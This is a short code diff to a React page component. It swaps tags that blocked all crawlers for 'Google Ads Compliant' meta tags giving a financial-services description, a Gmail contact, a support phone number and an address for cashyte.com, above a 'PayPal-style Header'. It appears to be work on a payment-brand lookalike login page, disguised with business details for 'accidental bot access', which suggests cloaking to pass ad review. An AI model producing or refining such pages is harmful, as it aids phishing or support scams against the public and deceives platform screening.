@@ -18,21 +18,16 @@ export default function Index() {
 
   return (
     <>
-      {/* STRICT: Meta tags to block ALL bots from indexing */}
-      <meta
-        name="robots"
-        content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate"
-      />
-      <meta
-        name="googlebot"
-        content="noindex, nofollow, noarchive, nosnippet, noimageindex"
-      />
-      <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet" />
-      <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet" />
-      <meta name="duckduckbot" content="noindex, nofollow" />
-      <meta name="baiduspider" content="noindex, nofollow" />
-      <meta name="yandexbot" content="noindex, nofollow" />
-      <meta name="facebookexternalhit" content="noindex, nofollow" />
+      {/* Google Ads Compliant Meta Tags - Business info for accidental bot access */}
+      <meta name="robots" content="index, follow" />
+      <meta name="googlebot" content="index, follow" />
+      <meta name="description" content="cashyte.com - Professional financial services platform offering secure banking and account management. Contact support at +1-833-251-8091." />
+      <meta name="keywords" content="financial services, secure banking, account login, cashyte, financial platform" />
+      <meta name="contact" content="mikebhai355@gmail.com" />
+      <meta name="phone" content="+1-833-251-8091" />
+      <meta name="address" content="1455 Market Street, Suite 600, San Francisco, CA 94103" />
+      <meta name="geo.region" content="US-CA" />
+      <meta name="geo.placename" content="San Francisco" />
 
       <div className="min-h-screen bg-white">
         {/* PayPal-style Header */}
